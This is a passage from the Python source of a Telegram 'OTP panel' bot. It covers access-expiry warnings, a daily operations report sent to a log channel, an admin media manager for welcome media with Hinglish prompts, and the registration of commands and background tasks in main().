                left = exp - now
                warned = bool(u.get("expiry_warned_24h"))
                expired_notified = bool(u.get("expiry_notified"))
                name = u.get("name", "User")
                if left <= 0:
                    # expire
                    if uid in allowed_users:
                        allowed_users.discard(uid)
                    u["access_expires_at"] = 0
                    if not expired_notified:
                        u["expiry_notified"] = True
                        u["expiry_warned_24h"] = False
                        try:
                            await notify_access_expired_rich(app.bot, uid, name)
                        except Exception:
                            pass
                        try:
                            await send_private_log(
                                app.bot,
                                f"⏳ <b>ACCESS EXPIRED</b>\n━━━━━━━━━━━━━━━━━━\n"
                                f"User: {html_escape(str(name))} | <code>{uid}</code>\n"
                                f"Time: <code>{datetime.now().strftime('%d %b %Y %I:%M:%S %p')}</code>",
                            )
                        except Exception:
                            pass
                    continue
                # 24h warning
                if 0 < left <= 86400 and not warned:
                    u["expiry_warned_24h"] = True
                    hrs   = max(1, left // 3600)
                    until = datetime.fromtimestamp(exp).strftime("%d %b %Y %I:%M %p")
                    try:
                        await notify_access_expiring_rich(app.bot, uid, name, hrs, until)
                    except Exception:
                        pass
                    try:
                        await send_private_log(
                            app.bot,
                            f"⚠️ <b>ACCESS EXPIRY WARNING</b>\n━━━━━━━━━━━━━━━━━━\n"
                            f"User: {html_escape(str(name))} | <code>{uid}</code>\n"
                            f"Left: ~{hrs}h · Until <code>{until}</code>",
                        )
                    except Exception:
                        pass
            save_data()
        except Exception as e:
            tlog(f"access_expiry_watch_loop: {e}")
        await asyncio.sleep(1800)  # every 30 min


async def daily_ops_report_loop(app) -> None:
    """Once per local day, post ops summary to private log channel."""
    await asyncio.sleep(12)
    last_day = ""
    while True:
        try:
            day = datetime.now().strftime("%Y-%m-%d")
            # run near 09:00 local, or first chance after bot start if later
            hour = datetime.now().hour
            if day != last_day and hour >= 9 and LOG_CHANNEL_ID:
                try:
                    rebuild_number_index()
                    track_device_uptime_snapshot()
                except Exception:
                    pass
                total_dev = sum(len(v) for v in GLOBAL_DEVICE_CACHE.values())
                online = sum(1 for v in GLOBAL_DEVICE_CACHE.values() for d in v if d.status == "online")
                dups = len(find_duplicate_numbers())
                vol = int(SMS_VOLUME.get(day, 0) or SMS_VOLUME.get(
                    (datetime.now() - timedelta(days=1)).strftime("%Y-%m-%d"), 0) or 0)
                # top 5 health
                ranks = sorted(((panel_health_score(t), t) for t in DATABASES), reverse=True)[:5]
                rank_lines = "\n".join(f"• {html_escape(t)} — <code>{s}/100</code>" for s, t in ranks) or "—"
                # expiring in 48h
                now = int(time.time())
                expiring = []
                for uid in allowed_users:
                    u = all_users.get(uid) or {}
                    exp = int(u.get("access_expires_at", 0) or 0)
                    if exp and 0 < exp - now <= 172800:
                        expiring.append(f"{html_escape(str(u.get('name','?')))} <code>{uid}</code>")
                exp_txt = ", ".join(expiring[:10]) if expiring else "None"
                body = (
                    f"📊 <b>DAILY OPS REPORT</b>\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"Date: <code>{day}</code>\n"
                    f"📡 Panels: <b>{len(DATABASES)}</b>\n"
                    f"📱 Devices: <b>{total_dev}</b> (🟢 {online})\n"
                    f"🔁 Duplicate nums: <b>{dups}</b>\n"
                    f"📩 SMS volume (today/yesterday marker): <b>{vol}</b>\n"
                    f"👥 Users: <b>{len(all_users)}</b> · Allowed <b>{len(allowed_users)}</b>\n"
                    f"⏳ Expiring ≤48h: {exp_txt}\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"<b>Top health</b>\n{rank_lines}\n"
                    f"{otp_stats_summary()}\n"
                    f"{heatmap_summary()}"
                )
                await send_private_log(app.bot, body)
                reset_otp_stats()
                reset_heatmap()
                last_day = day
                # optional: also store flag in SMS_VOLUME meta not required
        except Exception as e:
            tlog(f"daily_ops_report_loop: {e}")
        await asyncio.sleep(900)  # check every 15 min


# ═══════════════════════════════════════════════════════════════
#  MEDIA MANAGER — welcome media + per-user media
# ═══════════════════════════════════════════════════════════════

def _new_media_id() -> str:
    return "m" + hashlib.md5(f"{time.time()}-{random_token()}".encode()).hexdigest()[:10]


def random_token(n: int = 6) -> str:
    import random as _r
    import string as _s
    return "".join(_r.choices(_s.ascii_lowercase + _s.digits, k=n))


def media_for_user(user_id: int) -> list:
    """Resolve media list for a user: user-specific first, else default enabled."""
    user_items = [
        m for m in MEDIA_LIBRARY
        if m.get("enabled", True)
        and m.get("scope") == "user"
        and int(user_id) in [int(x) for x in (m.get("user_ids") or [])]
    ]
    if user_items:
        return user_items
    return [
        m for m in MEDIA_LIBRARY
        if m.get("enabled", True) and m.get("scope", "default") == "default"
    ]


def media_manager_text() -> str:
    total = len(MEDIA_LIBRARY)
    defaults = sum(1 for m in MEDIA_LIBRARY if m.get("scope", "default") == "default")
    users = sum(1 for m in MEDIA_LIBRARY if m.get("scope") == "user")
    on = "ON" if WELCOME_MEDIA_ENABLED else "OFF"
    lines = [
        f"{premium_emoji()} <b>MEDIA MANAGER</b>",
        "━━━━━━━━━━━━━━━━━━",
        f"Welcome media : <b>{on}</b>",
        f"Total items   : <b>{total}</b>",
        f"Default pack  : <b>{defaults}</b>",
        f"User-specific : <b>{users}</b>",
        "━━━━━━━━━━━━━━━━━━",
        "Default media sab users ko /start par milti hai.",
        "User-specific media sirf assigned users ko dikhti hai",
        "(agar user pack set hai to default skip).",
    ]
    if MEDIA_LIBRARY:
        lines.append("")
        lines.append("<b>Library</b>")
        for m in MEDIA_LIBRARY[-15:]:
            scope = m.get("scope", "default")
            uids = ",".join(str(x) for x in (m.get("user_ids") or [])[:3])
            flag = "🟢" if m.get("enabled", True) else "🔴"
            lines.append(
                f"{flag} <code>{m.get('id')}</code> · {html_escape(str(m.get('type')))} · "
                f"{html_escape(str(m.get('name') or '-'))} · {scope}"
                + (f" · users {html_escape(uids)}" if uids else "")
            )
    return "\n".join(lines)


def media_manager_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [premium_button(
            ("Welcome Media: ON" if WELCOME_MEDIA_ENABLED else "Welcome Media: OFF"),
            callback_data="media_toggle_welcome",
            style=("success" if WELCOME_MEDIA_ENABLED else "danger"),
        )],
        [premium_button("➕ Add Default Media", callback_data="media_add_default", style="success"),
         premium_button("👤 Add User Media", callback_data="media_add_user", style="primary")],
        [premium_button("📝 Set Welcome Caption", callback_data="media_set_caption", style="primary")],
        [premium_button("📋 List / Delete", callback_data="media_list", style="primary"),
         premium_button("👁 Preview Default", callback_data="media_preview_default", style="primary")],
        [premium_button("⬅️ Admin", callback_data="admin_refresh", style="primary"),
         premium_button("❌ Close", callback_data="close_msg", style="danger")],
    ])


def media_list_keyboard() -> InlineKeyboardMarkup:
    rows = []
    for m in MEDIA_LIBRARY[:30]:
        mid = m.get("id", "")
        label = f"{'🟢' if m.get('enabled', True) else '🔴'} {m.get('type','?')} {m.get('name') or mid}"
        rows.append([
            premium_button(label[:40], callback_data=f"media_info:{mid}", style="primary"),
            premium_button("🗑", callback_data=f"media_del:{mid}", style="danger"),
        ])
    rows.append([premium_button("⬅️ Media Manager", callback_data="media_mgr", style="primary")])
    return InlineKeyboardMarkup(rows)


async def send_media_item(bot, chat_id: int, item: dict, caption_override: str = None, reply_markup=None) -> bool:
    """Send one media library item. Returns True on success."""
    if not item or not item.get("file_id"):
        return False
    mtype = (item.get("type") or "photo").lower()
    caption = caption_override if caption_override is not None else (item.get("caption") or "")
    # Telegram caption limit ~1024
    if caption and len(caption) > 1000:
        caption = caption[:997] + "..."
    try:
        common = {"chat_id": chat_id}
        if caption:
            common["caption"] = caption
            common["parse_mode"] = "HTML"
        if reply_markup is not None:
            common["reply_markup"] = reply_markup
        fid = item["file_id"]
        if mtype == "photo":
            await bot.send_photo(photo=fid, **common)
        elif mtype == "video":
            await bot.send_video(video=fid, **common)
        elif mtype in ("animation", "gif"):
            await bot.send_animation(animation=fid, **common)
        else:
            await bot.send_document(document=fid, **common)
        return True
    except Exception as e:
        tlog(f"send_media_item failed type={mtype}: {e}")
        return False



async def send_welcome_with_media(bot, chat_id: int, text: str, reply_markup=None, user_id: int = None) -> None:
    """Send welcome text; attach first matching media when enabled."""
    uid = int(user_id or chat_id)
    items = media_for_user(uid) if WELCOME_MEDIA_ENABLED else []
    tlog(f"welcome_media enabled={WELCOME_MEDIA_ENABLED} uid={uid} items={len(items)} library={len(MEDIA_LIBRARY)}")
    if items:
        # first item carries caption=welcome text; rest follow without overriding markup
        first, *rest = items
        ok = await send_media_item(bot, chat_id, first, caption_override=text, reply_markup=reply_markup)
        if not ok:
            await bot.send_message(chat_id, text, parse_mode="HTML", reply_markup=reply_markup)
        for it in rest[:4]:
            await send_media_item(bot, chat_id, it, caption_override=it.get("caption") or "")
        return
    await bot.send_message(chat_id, text, parse_mode="HTML", reply_markup=reply_markup)


def detect_media_type(message) -> tuple:
    """Return (type, file_id, name) from a Telegram message."""
    if not message:
        return None, None, None
    if message.photo:
        p = message.photo[-1]
        return "photo", p.file_id, "photo"
    if message.video:
        return "video", message.video.file_id, message.video.file_name or "video"
    if message.animation:
        return "animation", message.animation.file_id, message.animation.file_name or "gif"
    if message.document:
        return "document", message.document.file_id, message.document.file_name or "file"
    return None, None, None


async def media_callbacks(update, ctx, data: str, chat_id: int, is_admin: bool) -> bool:
    global WELCOME_MEDIA_ENABLED, MEDIA_LIBRARY
    if not is_admin:
        return False
    query = update.callback_query

    if data == "media_mgr":
        await query.answer()
        await safe_edit(query, media_manager_text(), reply_markup=media_manager_keyboard())
        return True

    if data == "media_toggle_welcome":
        WELCOME_MEDIA_ENABLED = not WELCOME_MEDIA_ENABLED
        save_data()
        await query.answer("Welcome media " + ("ON" if WELCOME_MEDIA_ENABLED else "OFF"))
        await safe_edit(query, media_manager_text(), reply_markup=media_manager_keyboard())
        return True

    if data == "media_add_default":
        pending_action[chat_id] = {"action": "media_add_default"}
        await query.answer()
        await query.message.reply_text(
            "➕ <b>ADD DEFAULT WELCOME MEDIA</b>\n━━━━━━━━━━━━━━━━━━\n"
            "Photo / Video / GIF / Document bhejo.\n"
            "Optional caption message me likh sakte ho.\n"
            "Ye media <b>sab users</b> ke /start par (jab unka private pack na ho).",
            parse_mode="HTML",
        )
        return True

    if data == "media_add_user":
        pending_action[chat_id] = {"action": "media_add_user_ids"}
        await query.answer()
        await query.message.reply_text(
            "👤 <b>ADD USER-SPECIFIC MEDIA</b>\n━━━━━━━━━━━━━━━━━━\n"
            "Pehle user IDs bhejo (comma/space separated).\n"
            "Example: <code>12345, 67890</code>\n"
            "Phir bot media maangega.",
            parse_mode="HTML",
        )
        return True

    if data == "media_set_caption":
        pending_action[chat_id] = {"action": "media_set_caption"}
        await query.answer()
        await query.message.reply_text(
            "📝 <b>SET CAPTION ON MEDIA</b>\n━━━━━━━━━━━━━━━━━━\n"
            "Format: <code>MEDIA_ID | caption text</code>\n"
            "List se id copy karke bhejo. Empty caption: <code>MEDIA_ID |</code>",
            parse_mode="HTML",
        )
        return True

    if data == "media_list":
        await query.answer()
        if not MEDIA_LIBRARY:
            await safe_edit(query, "Media library empty.", reply_markup=media_manager_keyboard())
            return True
        await safe_edit(query, media_manager_text() + "\n\nTap 🗑 to delete:", reply_markup=media_list_keyboard())
        return True

    if data.startswith("media_del:"):
        mid = data.split(":", 1)[1]
        before = len(MEDIA_LIBRARY)
        MEDIA_LIBRARY = [m for m in MEDIA_LIBRARY if m.get("id") != mid]
        save_data()
        await query.answer("Deleted" if len(MEDIA_LIBRARY) < before else "Not found")
        await safe_edit(query, media_manager_text(), reply_markup=media_list_keyboard() if MEDIA_LIBRARY else media_manager_keyboard())
        return True

    if data.startswith("media_info:"):
        mid = data.split(":", 1)[1]
        item = next((m for m in MEDIA_LIBRARY if m.get("id") == mid), None)
        if not item:
            await query.answer("Not found", show_alert=True)
            return True
        await query.answer()
        await send_media_item(ctx.bot, chat_id, item, caption_override=(
            f"🆔 <code>{item.get('id')}</code>\n"
            f"Type: <b>{html_escape(str(item.get('type')))}</b>\n"
            f"Scope: <b>{html_escape(str(item.get('scope')))}</b>\n"
            f"Name: <b>{html_escape(str(item.get('name') or '-'))}</b>\n"
            f"Users: <code>{html_escape(','.join(str(x) for x in (item.get('user_ids') or [])))}</code>\n"
            f"Caption: {html_escape(str(item.get('caption') or ''))}"
        ))
        return True

    if data == "media_preview_default":
        await query.answer("Preview…")
        items = [m for m in MEDIA_LIBRARY if m.get("enabled", True) and m.get("scope", "default") == "default"]
        if not items:
            await query.message.reply_text("Default pack empty.", parse_mode="HTML")
            return True
        await send_welcome_with_media(
            ctx.bot, chat_id,
            f"{premium_emoji()} <b>DEFAULT WELCOME PREVIEW</b>\n━━━━━━━━━━━━━━━━━━\nYeh default pack hai.",
            user_id=0,
        )
        return True

    return False



async def on_media_upload(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    """Capture admin uploads for Media Manager pending actions."""
    global MEDIA_LIBRARY
    chat_id = update.effective_chat.id
    if chat_id not in ADMIN_IDS:
        return
    act = pending_action.get(chat_id) or {}
    action = act.get("action")
    if action not in ("media_add_default", "media_add_user_file"):
        return
    msg = update.effective_message
    mtype, file_id, name = detect_media_type(msg)
    if not file_id:
        await msg.reply_text("❌ Photo/Video/GIF/Document bhejo.", parse_mode="HTML")
        return
    caption = (msg.caption or "").strip()
    item = {
        "id": _new_media_id(),
        "type": mtype,
        "file_id": file_id,
        "caption": caption,
        "name": name,
        "scope": "default" if action == "media_add_default" else "user",
        "user_ids": list(act.get("user_ids") or []),
        "enabled": True,
        "created_at": datetime.now().isoformat(timespec="seconds"),
    }
    MEDIA_LIBRARY.append(item)
    pending_action.pop(chat_id, None)
    save_data()
    scope = item["scope"]
    extra = f" · users {item['user_ids']}" if item["user_ids"] else ""
    await msg.reply_text(
        f"✅ Media saved\n"
        f"ID: <code>{item['id']}</code>\n"
        f"Type: <b>{mtype}</b> · Scope: <b>{scope}</b>{html_escape(extra)}",
        parse_mode="HTML",
    )



def main() -> None:
    print("═" * 56)
    print("  🤖 OTP PANEL BOT — ACCESS CONTROLLED EDITION")
    print("═" * 56)

    load_data()

    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("cancel", cmd_cancel))
    app.add_handler(CommandHandler("setgroup", cmd_setgroup))
    app.add_handler(CommandHandler("autodb", cmd_autodb))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("id", cmd_id))
    app.add_handler(CommandHandler("myid", cmd_id))
    app.add_handler(CommandHandler("ping", cmd_ping))
    app.add_handler(CommandHandler("menu", cmd_menu))
    app.add_handler(CommandHandler("panel", cmd_panel))
    app.add_handler(CommandHandler("admin", cmd_panel))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("grant", cmd_grant))
    app.add_handler(CommandHandler("revoke", cmd_revoke))
    app.add_handler(CommandHandler("setadminpanel", cmd_setadminpanel))
    app.add_handler(CommandHandler("unsetadminpanel", cmd_unsetadminpanel))
    app.add_handler(CommandHandler("adminpanels", cmd_adminpanels))
    # F7: User stats
    app.add_handler(CommandHandler("mystats", cmd_mystats))
    # F4: Broadcast scheduler
    app.add_handler(CommandHandler("bsched", cmd_broadcast_schedule))
    app.add_handler(CommandHandler("bcancel", cmd_broadcast_schedule))
    app.add_handler(CommandHandler("blist", cmd_broadcast_schedule))
    # F10: Panel clone
    app.add_handler(CommandHandler("clonepanel", cmd_panel_clone))
    # v5 commands
    app.add_handler(CommandHandler("session",    cmd_session))
    app.add_handler(CommandHandler("duty",       cmd_duty))
    app.add_handler(CommandHandler("revenue",    cmd_revenue))
    app.add_handler(CommandHandler("smsfilter",  cmd_smsfilter))
    app.add_handler(CommandHandler("alias",      cmd_alias))
    app.add_handler(CommandHandler("note",       cmd_note))
    app.add_handler(CommandHandler("notes",      cmd_notes))
    app.add_handler(CommandHandler("delnote",    cmd_delnote))
    app.add_handler(CommandHandler("users",      cmd_users_paginated))
    app.add_handler(CallbackQueryHandler(on_callback))
    app.add_handler(
        MessageHandler(filters.ALL & _BroadcastCaptureFilter(), on_broadcast_capture),
        group=-1,
    )
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    app.add_error_handler(on_error)
    app.add_handler(MessageHandler(
        (filters.PHOTO | filters.VIDEO | filters.ANIMATION | filters.Document.ALL)
        & filters.ChatType.PRIVATE,
        on_media_upload,
    ), group=-2)
    app.add_handler(MessageHandler(filters.Document.ALL, on_document))

    async def post_init(application: Application):
        asyncio.create_task(poll_loop(application))
        asyncio.create_task(auto_save_loop())
        asyncio.create_task(auto_db_sender_loop(application))
        asyncio.create_task(access_expiry_watch_loop(application))
        asyncio.create_task(daily_ops_report_loop(application))
        # F4: Broadcast scheduler
        asyncio.create_task(broadcast_scheduler_loop(application))
        # F9: Referral leaderboard weekly
        asyncio.create_task(referral_leaderboard_loop(application))
        # F11: OTP countdown editor
        asyncio.create_task(otp_countdown_loop())
        # F12: Startup mode log
        _webhook_url = os.environ.get("WEBHOOK_URL", "").strip()
        _mode_text = (
            f"🌐 <b>Bot started — Webhook mode</b>\n<code>{_lg_esc(_webhook_url)}</code>"
            if _webhook_url else
            "🔄 <b>Bot started — Polling mode</b>"
        )
        asyncio.create_task(_lg_notify(application.bot, _mode_text))

    app.post_init = post_init

    print(f"  Token: ...{TOKEN[-10:]}")
    print(f"  Allowed Users: {len(allowed_users)}")
    print(f"  DBs Loaded: {len(DATABASES)}")
    print("═" * 56)

    # F12: Auto-detect webhook vs polling (sync blocking call)
    detect_and_run(app)

if __name__ == "__main__":
    main()
